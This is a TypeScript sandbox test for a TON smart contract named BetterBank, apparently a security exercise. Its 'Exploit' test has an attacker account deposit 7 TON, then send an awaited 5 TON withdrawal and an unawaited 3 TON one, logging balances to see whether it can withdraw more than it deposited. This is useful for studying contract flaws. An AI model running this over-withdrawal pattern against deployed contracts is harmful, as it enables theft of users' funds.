import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { Cell, Dictionary, fromNano, toNano, Address } from '@ton/core';
import { BetterBank, value } from '../wrappers/wrappers/BetterBank';
import '@ton/test-utils';
import { compile } from '@ton/blueprint';

// npx blueprint test BetterBank.spec.ts
describe('BetterBank', () => {
    let code: Cell;

    beforeAll(async () => {
        code = await compile('BetterBank');
    });

    let blockchain: Blockchain;
    let owner: SandboxContract<TreasuryContract>;
    let exploiter: SandboxContract<TreasuryContract>;
    let bank: SandboxContract<BetterBank>;
    let initBalance: bigint;

    beforeEach(async () => {
        initBalance = toNano('0.2');
        blockchain = await Blockchain.create();

        owner = await blockchain.treasury('owner');
        exploiter = await blockchain.treasury('exploiter');

        const emptyDict = Dictionary.empty<bigint, bigint>(Dictionary.Keys.BigUint(256), value);

        bank = blockchain.openContract(BetterBank.createFromConfig({ accounts: emptyDict, total_balance: 0n }, code));

        const deployResult = await bank.sendDeploy(owner.getSender(), initBalance);

        expect(deployResult.transactions).toHaveTransaction({
            from: owner.address,
            to: bank.address,
            deploy: true,
            success: true,
        });

        await bank.sendDeposit(owner.getSender(), toNano('10'));
    });

    it('should deploy', async () => {});

    it('Exploit', async () => {
        await getBankBalance();
        await getUserBalance(exploiter.address);
        await getTotalBalance();

        await bank.sendDeposit(exploiter.getSender(), toNano('7'));

        await getBankBalance();
        await getUserBalance(exploiter.address);
        await getTotalBalance();

        await bank.sendWithdraw(exploiter.getSender(), toNano('0.5'), toNano('5'));
        bank.sendWithdraw(exploiter.getSender(), toNano('0.5'), toNano('3'));

        console.log((await blockchain.getContract(bank.address)).accountState?.type);
        await getBankBalance();
        await getUserBalance(exploiter.address);
        await getTotalBalance();
    });

    const getBankBalance = async () => {
        console.log('Bank balance', fromNano((await blockchain.getContract(bank.address)).balance));
    };

    const getUserBalance = async (user: Address) => {
        console.log('User balance', fromNano(await bank.getUserBalance(await bank.getParseStdAddr(user))));
    };

    const getTotalBalance = async () => {
        console.log('Total', fromNano(await bank.getTotalBalance()));
    };
});
